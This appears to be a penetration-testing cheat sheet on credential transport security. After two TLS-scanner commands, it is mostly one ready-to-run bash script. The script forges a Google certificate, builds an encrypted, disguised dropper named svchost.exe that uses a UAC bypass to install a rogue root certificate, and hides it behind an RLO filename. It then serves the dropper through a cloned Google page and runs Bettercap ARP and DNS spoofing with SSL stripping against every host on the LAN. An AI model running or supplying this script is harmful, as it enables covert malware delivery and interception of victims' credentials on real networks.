# Credentials Encrypted Channel

## Check List

* [ ] _Identify sensitive information transmitted through the various channels._
* [ ] _Assess the privacy and security of the channels used._

## Cheat Sheet

### Scan Vulns

#### [testssl.sh](https://github.com/testssl/testssl.sh)

```bash
testssl $WEBSITE
```

#### [SSLyze](https://github.com/nabla-c0d3/sslyze)

```bash
sslyze --regular $WEBSITE
```

### Man In The Middle

#### [Bettercap](https://www.bettercap.org/)

_Create Script_

```bash
sudo nano mitm-bettercap.sh
```

```bash
#!/bin/bash

# --- Color Codes ---
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# --- Root Privilege Check ---
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }

# --- Install Required Tools ---
color_print CYAN "[*] Checking and installing required tools..."
packages=(
  wget curl jq rar unzip imagemagick apache2 arp-scan python3 python3-pip wine64 winbind winetricks metasploit-framework bettercap
)

for pkg in "${packages[@]}"; do
  if ! dpkg -s "$pkg" &>/dev/null; then
    color_print YELLOW "[!] Package $pkg not found. Installing..."
    apt install -y "$pkg"
  fi
done

# --- Setup WINE and Install Windows Python ---
color_print GREEN "[*] Setting up WINE and installing Windows Python..."
export WINEPREFIX="$HOME/.wine64"
export WINEARCH=win64
python_ver="3.13.5"
python_ver_current=$(wine cmd /c "python --version" 2>&1 | awk '{print $2}')
if [ ! "$python_ver" == "$python_ver_current" ]; then
    wineboot --init
    wget -q -O "/tmp/python3.exe" "https://www.python.org/ftp/python/${python_ver}/python-${python_ver}-amd64.exe"
    wine /tmp/python3.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    rm -f "/tmp/python3.exe"
fi

# --- Download UPX for Windows ---
color_print CYAN "[*] Downloading UPX for Windows..."
upx_ver="5.0.2"
upx_ver_current=$(wine cmd /c "$WINEPREFIX/drive_c/upx/upx.exe -L" 2>&1 | head -n1 | awk '{print $2}')
if [ ! "$upx_ver" == "$upx_ver_current" ]; then
    wget -q -O "/tmp/upx.zip" "https://github.com/upx/upx/releases/download/v${upx_ver}/upx-${upx_ver}-win64.zip"
    mkdir -p "$WINEPREFIX/drive_c/upx"
    unzip -q -o "/tmp/upx.zip" -d "/tmp"
    cp "/tmp/upx-${upx_ver}-win64/upx.exe" "$WINEPREFIX/drive_c/upx/"
fi

# --- Detect Interface and Local IP ---
color_print GREEN "[*] Detecting network interface and local IP..."
IFACE=$(ip route | grep '^default' | awk '{print $5}' | head -1)
LAN=$(ip -4 addr show "$IFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)

# --- Cleanup ---
pkill -f "ngrok|ruby|msfconsole|apache2"
rm -rf "$HOME/.msf4/loot/" \
       "$HOME/wine-pyinstaller/dist" \
       "$WINEPREFIX/drive_c/pyinstaller-build" \
mkdir -p "$WINEPREFIX/drive_c/pyinstaller-build"

# --- Generate Fake Certificate using Metasploit ---
color_print CYAN "[*] Generating fake certificate using Metasploit..."
msfconsole -qx "use auxiliary/gather/impersonate_ssl;set RHOSTS google.com;run;exit"
CERT_CRT=$(find "$HOME/.msf4/loot/" -type f -name "*.crt" | head -1)
CERT_KEY=$(find "$HOME/.msf4/loot/" -type f -name "*.key" | head -1)
cp -f "$CERT_CRT" "/var/www/html/google.crt"

# --- Download Image and Create Icon ---
color_print CYAN "[*] Download Image and Create Icon..."
wget -q -O /tmp/google.jpg "https://wallpapers.com/images/hd/google-starry-night-dzelbpuo5oj39ie6.jpg"
convert /tmp/google.jpg -define icon:auto-resize=256,128,96,64,48,32,16 /tmp/google.ico

# --- Generate random AES Key and IV ---
KEY=$(head -c 16 /dev/urandom | xxd -p)
IV=$(head -c 16 /dev/urandom | xxd -p)

# --- Build Encrypted Python Installer ---
color_print GREEN "[*] Building AES-CBC encrypted Python installer..."
python3 - <<PYTHON
from Crypto.Cipher import AES
import base64
import os

key = bytes.fromhex("$KEY")
iv = bytes.fromhex("$IV")

with open("/var/www/html/google.crt", "rb") as f:
    cert_b64 = base64.b64encode(f.read()).decode()

payload = f'''
import os, subprocess, tempfile, base64, time, winreg, sys

CERT_DATA = """{cert_b64}"""
CERT_FILENAME = "google.crt"
TMP_CERT_PATH = os.path.join(tempfile.gettempdir(), CERT_FILENAME)
REG_PATH = r"Software\\\\Classes\\\\ms-settings\\\\Shell\\\\Open\\\\command"
FODHELPER_EXE = r"C:\\\\Windows\\\\System32\\\\fodhelper.exe"
CERTUTIL_CMD = f'cmd /c certutil -addstore -f Root "{{TMP_CERT_PATH}}"'

def write_cert():
    try:
        with open(TMP_CERT_PATH, "wb") as f:
            f.write(base64.b64decode(CERT_DATA))
    except:
        pass

def remove_cert():
    try:
        os.remove(TMP_CERT_PATH)
    except:
        pass

def uac_bypass(cmd):
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(key)
        subprocess.Popen([FODHELPER_EXE], shell=False,
                         stdin=subprocess.DEVNULL,
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
        time.sleep(3)
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\\\\Classes\\\\ms-settings\\\\Shell\\\\Open")
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\\\\Classes\\\\ms-settings\\\\Shell")
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\\\\Classes\\\\ms-settings")
    except:
        pass

write_cert()
uac_bypass(CERTUTIL_CMD)
remove_cert()
sys.exit(0)
'''

def pad(data):
    return data + b"\x00" * (16 - (len(data) % 16))

cipher = AES.new(key, AES.MODE_CBC, iv)
enc = cipher.encrypt(pad(payload.encode()))

enc_b64 = base64.b64encode(enc).decode()

final_code = f"""
import base64
from Crypto.Cipher import AES

KEY = bytes.fromhex('{key.hex()}')
IV = bytes.fromhex('{iv.hex()}')
ENCRYPTED_PAYLOAD = b'''{enc_b64}'''

def decrypt_and_run(data):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    decrypted = cipher.decrypt(base64.b64decode(data))
    code = decrypted.rstrip(b'\\x00').decode()
    exec(code, globals())

if __name__ == "__main__":
    decrypt_and_run(ENCRYPTED_PAYLOAD)
"""

with open("/tmp/cert-installer.py", "w") as f:
    f.write(final_code)
PYTHON

cp -f "/tmp/cert-installer.py" "$WINEPREFIX/drive_c/pyinstaller-build/cert_installer.py"
cp -f "/tmp/google.ico" "$WINEPREFIX/drive_c/pyinstaller-build/google.ico"

# --- Install PyInstaller and Build EXE Hidden ---
wine python -m pip install --upgrade pip setuptools wheel
wine python -m pip install pyinstaller
wine pyinstaller --onefile --noconfirm --noconsole \
    --icon "C:\\pyinstaller-build\\google.ico" \
    --name "svchost.exe" \
    --upx-dir "C:\\upx" \
    "C:\\pyinstaller-build\\cert_installer.py"
cp -f "$WINEPREFIX/drive_c/users/$USER/dist/svchost.exe" "$HOME/wine-pyinstaller/dist/"

# --- Create SFX RAR with RLO Filename ---
cat > /tmp/sfx.txt << EOF
;The comment below contains SFX script commands
Path=C:\\Users\\%username%\\AppData\\Local\\Temp
Setup=svchost.exe
Presetup=google.jpg
Silent=1
Overwrite=1
Update=U
EOF
rar a -sfx -z"/tmp/sfx.txt" "/var/www/html/google-update-%E2%80%AEexe.jpg" "$HOME/wine-pyinstaller/dist/svchost.exe" /tmp/google.jpg

# --- Start Apache Server and Setup Injection ---
service apache2 restart
rm -rf /var/www/html/*
wget -q -O /var/www/html/index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" https://google.com
INJECT_HTML="<iframe id='frame' src='google-update-%E2%80%AEexe.jpg' application='yes' width=0 height=0 style='display:none;' frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>\n<script type='text/javascript'>setTimeout(function(){window.location.href='https://google.com';}, 3000);</script>"
sed -i "s|</body>|${INJECT_HTML}\n</body>|g" /var/www/html/index.html

# --- Scan Network for Victims ---
TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups --plain | awk '{print $1}' | grep -v "$LAN" | paste -sd ',' -)

# --- Create Bettercap Caplet for MITM with Downgrade Fallback ---
cat > "/tmp/mitm_fallback.cap" << EOF
set arp.spoof.targets $TARGETS
set arp.spoof.internal true
set https.proxy.engine true
set https.proxy.sslstrip true
set https.proxy.cert $CERT_CRT
set https.proxy.key $CERT_KEY
set http.proxy.injecthtml '<iframe src="http://$LAN/google-update-%E2%80%AEexe.jpg" width=0 height=0 style="display:none"></iframe>'
set net.sniff.verbose true
set net.sniff.output /tmp/bettercap.log
set dns.spoof.domains google.com
set dns.spoof.address $LAN
dns.spoof on
net.sniff on
http.proxy on
https.proxy on
arp.spoof on

event tls.handshake.failed do |e|
  puts "[!] TLS handshake failed with #{e[:ip]}"
end
EOF

bettercap -iface "$IFACE" -caplet "/tmp/mitm_fallback.cap"
```

_Run & Execute_

```bash
sudo chmod +x mitm-bettercap.sh;sudo ./mitm-bettercap.sh
```
